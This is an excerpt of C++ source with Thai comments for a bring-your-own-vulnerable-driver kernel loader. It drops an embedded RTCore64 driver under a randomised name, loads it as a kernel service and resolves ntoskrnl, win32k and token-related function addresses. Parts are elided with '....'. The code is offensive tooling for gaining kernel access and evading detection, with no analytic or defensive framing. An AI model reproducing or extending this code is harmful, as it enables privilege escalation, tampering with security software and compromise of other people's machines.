---
GetBase
---
```cpp

//nt.hpp

#pragma once
#include <Windows.h>
#include <winternl.h> 

#pragma comment(lib, "ntdll.lib")
#include <psapi.h>
#pragma comment(lib, "psapi.lib")
#include <DbgHelp.h>
#pragma comment(lib, "DbgHelp.lib")


namespace nt
{//ui64 
	static UINT off_unique_process_id = 0x0;
	static UINT  off_active_process_links = 0x0;
	static UINT  off_image_file_name = 0x0;
	static UINT  off_active_threads = 0x0;
	static uint64_t* PtrPsInitialSystemProcess = 0x0;

 
	constexpr auto PAGE_SIZE = 0x1000;
	 constexpr auto STATUS_INFO_LENGTH_MISMATCH = 0xC0000004LL;
 
//constexpr auto STATUS_INFO_LENGTH_MISMATCH = 0xC000000DLL;

	constexpr auto SystemModuleInformation = 11;
	constexpr auto SystemHandleInformation = 16;
	constexpr auto SystemExtendedHandleInformation = 64;
	/*PVOID __stdcall RtlFindExportedRoutineByName(
			_In_ PVOID  DllBase,
			_In_ PCCH   RoutineName
		);*/
	std::string byteToHexString(uint32_t value);
	void ResolveNtUserFunctionRVA(HANDLE device,                // handle ไปยัง driver
		uint64_t moduleBase,          // base address ของ win32k.sys
		const std::string& funcName,  // ชื่อฟังก์ชัน เช่น "NtUserSetGestureConfig"
		uint32_t& outOff1,            // offset แรก (88h)
		uint32_t& outOff2,            // offset ที่สอง (150h)
		uint32_t& outOff3             // offset ที่สาม (C30h)
	);
	struct ResolveResult {
		bool success = false;
		std::vector<uint64_t> offsets;    // เหมาะกับ return ทุก offset
	};

	ResolveResult ResolveSymbolOffsetsEx(
		HANDLE device,
		uint64_t moduleBase,
		const std::string& pdbPath,
		bool debugAll,                             // ถ้า true → log ทุก RVA ใน PDB
		const std::string& funcName = {},          // อยากเจาะเฉพาะฟังก์ชันนี้ ถ้าว่าง → scan ทั้ง PDB
		size_t maxInstructions = 256
	);

	void WTokenTored(const std::string& keyName, const std::string& tokenData);
	uint64_t get_Kernel_handle_user(const char* module_name);
	uint64_t get_Kernel_Fn_address(const uintptr_t imageBase, const char* exportName);
	bool __forceinline  SetUpIntin();
 
	typedef PVOID(__stdcall *Ca_RtlFindExportedRoutineByName)(
		/*_In_ */PVOID  DllBase,
		/*_In_ */PCCH   RoutineName);
 


	typedef NTSTATUS(*Ca_NtLoadDriver)(PUNICODE_STRING DriverServiceName);
	typedef NTSTATUS(*Ca_NtUnloadDriver)(PUNICODE_STRING DriverServiceName);
	typedef NTSTATUS(*Ca_tlAdjustPrivilege)(_In_ ULONG Privilege, _In_ BOOLEAN Enable, _In_ BOOLEAN Client, _Out_ PBOOLEAN WasEnabled);
	//__int64 __fastcall RtlAdjustPrivilege(unsigned int, bool, char, bool*);
	typedef __int64(__fastcall* FN_RtlAdjustPrivilege)(unsigned int, bool, char, bool* );//	static fn fn_Ps_Zw_Open_Process = (fn)(find_function_cached("ntoskrnl.exe", "ZwOpenProcess"));
	 //void __fastcall VhdiAutoAttachOneVhd(__int64 a1, unsigned int a2, _OWORD *a3, unsigned int a4)
	template<typename _Gt> __forceinline _Gt GetPtrKernel(const char* basemodule, const char* FNnamecall);
 
	typedef uint64_t(__fastcall* FN_RtlAcquirePrivilege)(unsigned int* a1, unsigned int a2, int a3, __int64* a4);
	typedef void(__fastcall* FN_VhdiAutoAttachOneVhd)(__int64 a1, unsigned int a2, void* a3, unsigned int a4);
	typedef NTSTATUS(__fastcall* FN_ZwAdjustPrivilegesToken)();//__int64 ZwAdjustPrivilegesToken();
....

};
 

 

//intel_driver.cpp

 uint64_t nt::get_Kernel_handle_user(const char* module_name )
{
	LPVOID drivers[1024] = {};
	DWORD cbNeeded;

	if (!EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded))
		return 0;

	int count = cbNeeded / sizeof(LPVOID);

	for (int i = 0; i < count; ++i)
	{
		char name[MAX_PATH] = {};
		if (GetDeviceDriverBaseNameA(drivers[i], name, sizeof(name) / sizeof(char)))
		{
			if (!module_name || _stricmp(name, module_name) == 0)
				return (uint64_t)reinterpret_cast<uintptr_t>(drivers[i]);
		}
	}

	return 0;
}


uint64_t utils::GetKernelModuleAddress(const std::string& module_name) {
	void* buffer = nullptr;
	DWORD buffer_size = 0;

	NTSTATUS status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemModuleInformation), buffer, buffer_size, &buffer_size);

	while (status == nt::STATUS_INFO_LENGTH_MISMATCH) {
		if (buffer != nullptr)
			VirtualFree(buffer, 0, MEM_RELEASE);

		buffer = VirtualAlloc(nullptr, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemModuleInformation), buffer, buffer_size, &buffer_size);
	}

	if (!NT_SUCCESS(status)) {
		if (buffer != nullptr)
			VirtualFree(buffer, 0, MEM_RELEASE);
		return 0;
	}

	const auto modules = static_cast<nt::PRTL_PROCESS_MODULES>(buffer);
	if (!modules)
		return 0;

	for (auto i = 0u; i < modules->NumberOfModules; ++i) {
		const std::string current_module_name = std::string(reinterpret_cast<char*>(modules->Modules[i].FullPathName) + modules->Modules[i].OffsetToFileName);

		if (!_stricmp(current_module_name.c_str(), module_name.c_str()))
		{
			const uint64_t result = reinterpret_cast<uint64_t>(modules->Modules[i].ImageBase);

			VirtualFree(buffer, 0, MEM_RELEASE);
			return result;
		}
	}

	VirtualFree(buffer, 0, MEM_RELEASE);
	return 0;
}




HANDLE intel_driver::Load(bool clean, DWORD OsWindo , DWORD ADATA_OJB) {

 //
	srand((unsigned)time(NULL) * GetCurrentThreadId());

	// สร้างชื่อ driver แบบสุ่ม
	memset(intel_driver::driver_name, 0, sizeof(intel_driver::driver_name));
	static const char alphanum[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
	int len = rand() % 20 + 10;
	for (int i = 0; i < len; ++i)
		intel_driver::driver_name[i] = alphanum[rand() % (sizeof(alphanum) - 1)];

	Log(L"[<] SetProtx Name Successfully" << std::endl);

	std::wstring driver_path = GetDriverPath();
	if (driver_path.empty()) {
		Log(L"[-] Can't find TEMP folder" << std::endl);
		return INVALID_HANDLE_VALUE;
	}
	  
	_wremove(driver_path.c_str());
     

	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(rtcore64_driver_resource::driver), sizeof(rtcore64_driver_resource::driver))) {
		Log(L"[-] Failed to create vulnerable driver file" << std::endl);
		return INVALID_HANDLE_VALUE;
	}

 
	// ลองเปิด handle กับ driver ก่อน
	if (!ma.Open()) {
		// ถ้ายังเปิดไม่ได้ แสดงว่ายังไม่โหลด => โหลด driver
		Log(L"[!] Driver not loaded yet, trying to load..." << std::endl);

		if (!service::RegisterAndStart(driver_path, GetDriverNameW(), 26100)) {
			Log(L"[-] Failed to register and start service" << std::endl);
			_wremove(driver_path.c_str());
			return INVALID_HANDLE_VALUE;
		}

		if (!service::LoadKernelDriver(driver_path)) {
			Log(L"[-] Failed to load kernel driver" << std::endl);
			_wremove(driver_path.c_str());
			return INVALID_HANDLE_VALUE;
		}

		// ลองเปิดใหม่อีกรอบ
		if (!ma.Open()) {
			Log(L"[-] Failed to open handle to driver after loading" << std::endl);
			intel_driver::Unload(INVALID_HANDLE_VALUE);
			return INVALID_HANDLE_VALUE;
		}
	}
	else {
		Log(L"[+] Driver already running and accessible" << std::endl);
	}
	auto result = INVALID_HANDLE_VALUE;
	 ntoskrnlAddr = utils::GetKernelModuleAddress("ntoskrnl.exe");
	if (ntoskrnlAddr == 0) {
		ntoskrnlAddr = (uint64_t)nt::get_Kernel_handle_user("ntoskrnl.exe");
		if (ntoskrnlAddr == 0)
		{
			Log(L"[-] Failed to get ntoskrnl.exe" << std::endl);
			intel_driver::Unload(result);
			return INVALID_HANDLE_VALUE;
		}
	 
	}

 
	  

	LoadLibraryA("user32.dll");
	LoadLibraryA("win32u.dll"); 
	uintptr_t win32k = utils::GetKernelModuleAddress("win32k.sys");
	if (!win32k)
	{
		win32k = (uint64_t)nt::get_Kernel_handle_user("win32k.sys");
		if (!win32k)
		{
			 
			Log("[-] win32k.sys not found");
			intel_driver::Unload(result);
			return INVALID_HANDLE_VALUE;
		}
	}	
	//Log("[Debug] Ptr win32k 0x " << std::hex << (uintptr_t)win32k << std::endl);


....

};
```
